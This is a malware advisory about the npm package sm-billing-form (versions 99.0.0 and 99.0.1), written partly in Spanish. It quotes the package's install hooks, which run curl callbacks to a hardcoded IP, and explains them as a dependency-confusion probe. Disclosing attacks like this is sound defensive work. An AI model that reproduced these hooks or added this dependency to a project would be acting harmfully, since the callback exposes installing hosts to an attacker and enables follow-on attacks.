# Aviso: Malicious code in sm-billing-form (npm) (GHSA-q99c-rfrp-g979)

## Resumen

## Source: amazon-inspector (422b9f6c71b124deff27a41ef4b595c308595c14af77dbd3756de0e625f86fc2)
package.json defines preinstall and postinstall lifecycle scripts that run `curl -s http://16.192.173.5/sm-billing-form/pre` and `curl -s http://16.192.173.5/sm-billing-form/post` on `npm install`. The requests target a hardcoded bare-IP endpoint over cleartext HTTP with no relationship to any documented publisher, and fire automatically as part of the default install. The pattern is a dependency-confusion / typosquat probe: the callback confirms to the operator of 16.192.173.5 which environments resolved the public `sm-billing-form` name and installed it, disclosing source IP and install timing and enabling targeted follow-on attacks against those hosts. The version number (99.0.0) is consistent with a dependency-confusion lure intended to outrank an internal package of the same name.

## Source: ossf-package-analysis (a67679a3ead3448ddc6b3e62b9dac763b12cf129253be8ae5a4678962db8b4df)
The OpenSSF Package Analysis project identified 'sm-billing-form' @ 99.0.1 (npm) as malicious.

It is considered malicious because:

- The package executes one or more commands associated with malicious behavior.

---

Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/69cf85db3ebafc0534169441a15154ec56e73b2b/osv/malicious/npm/sm-billing-form/MAL-2026-14395.json))

## Paquetes afectados

- `sm-billing-form` (npm), versiones afectadas: = 99.0.0
- `sm-billing-form` (npm), versiones afectadas: = 99.0.1

## Datos del aviso

- Tipo de aviso: malware
- Severidad: critical
- Publicado: 2026-08-24T06:30:33Z
- Fuente: https://github.com/advisories/GHSA-q99c-rfrp-g979

## Patrón a vigilar

Diff que añade (o fija por primera vez) una dependencia sobre cualquiera de los paquetes listados arriba, en cualquier versión del rango afectado -- el paquete en sí ES el malware, no hace falta ningún otro cambio sospechoso en el diff para que el riesgo sea máximo.
